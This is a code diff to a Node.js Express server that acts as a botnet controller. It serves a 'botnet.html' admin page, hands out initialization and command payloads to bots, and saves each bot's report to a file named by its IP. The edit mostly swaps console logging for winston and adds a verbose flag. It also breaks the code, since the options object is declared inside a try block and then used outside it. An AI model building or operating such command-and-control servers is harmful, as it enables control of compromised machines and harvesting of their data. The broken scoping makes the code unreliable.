@@ -6,6 +6,7 @@ var args       = require('command-line-args');
 var bodyParser = require('body-parser');
 var jsonFile   = require('jsonfile');
 var path       = require('path');
+var winston    = require('winston');
 
 
 /****************************************************************************** 
@@ -20,14 +21,22 @@ app.use(bodyParser.json());
 /****************************************************************************** 
 * OPTIONS 
 ******************************************************************************/
-const options = args([
-  { name: 'port', alias: 'p', type: Number },
-  { name: 'report', alias: 'r', type: String }
-]);
+try {
+  const options = args([
+    { name: 'port', alias: 'p', type: Number },
+    { name: 'report', alias: 'r', type: String },
+    { name: 'verbose', alias: 'v', type: Boolean }
+  ]);
+} catch (e) {
+  winston.error('Unknown option(s) found');
+  process.exit(1);
+}
 
 const port = options.port || 3000;
 
 const reportFilePattern = options.report || 'data/report/report.${botIp}.json';
+
+if (options.verbose) winston.level = 'verbose';
 
 
 /******************************************************************************
@@ -46,7 +55,6 @@ function fnLandingPage(req, res) {
 }
 
 function fnAdminPage(req, res) {
-  //res.sendFile(path.join(__dirname + '/views/admin.html'));
   res.sendFile(path.join(__dirname + '/views/botnet.html'));
 }
 
@@ -56,7 +64,7 @@ function fnGetInitialization(req, res) {
 
 function fnSubmitInitialization(req, res) {
   INITIALIZATION = req.body;
-  console.log('New initialization submitted: %s', JSON.stringify(INITIALIZATION));
+  winston.debug('New initialization submitted: ', JSON.stringify(INITIALIZATION));
   res.status(200);
 }
 
@@ -66,7 +74,7 @@ function fnGetCommand(req, res) {
 
 function fnSubmitCommand(req, res) {
   COMMAND = req.body;
-  console.log('New command submitted: %s', JSON.stringify(COMMAND));
+  winston.debug('New command submitted: ', JSON.stringify(COMMAND));
   res.status(200);
 }
 
@@ -74,9 +82,9 @@ function fnReport(req, res) {
 	var report = req.body;
   var bip    = req.ip;
   var file   = reportFilePattern.replace(/\$\{botIp\}/, bip);
-  console.log('Received report from %s: %s', bip, JSON.stringify(report));
+  winston.debug('Received report from %s: %s', bip, JSON.stringify(report));
 	jsonFile.writeFile(file, report, {spaces: 2});
-  console.log('Report saved in %s', file);
+  winston.debug('Report saved in %s', file);
 	res.send('Report saved')
 };
 
@@ -103,5 +111,5 @@ app.post('/report', fnReport);
 * START 
 ******************************************************************************/
 app.listen(port, function () {
-  console.log('Controller ready on port %d', port)
+  winston.info('Controller ready on port %d', port)
 });
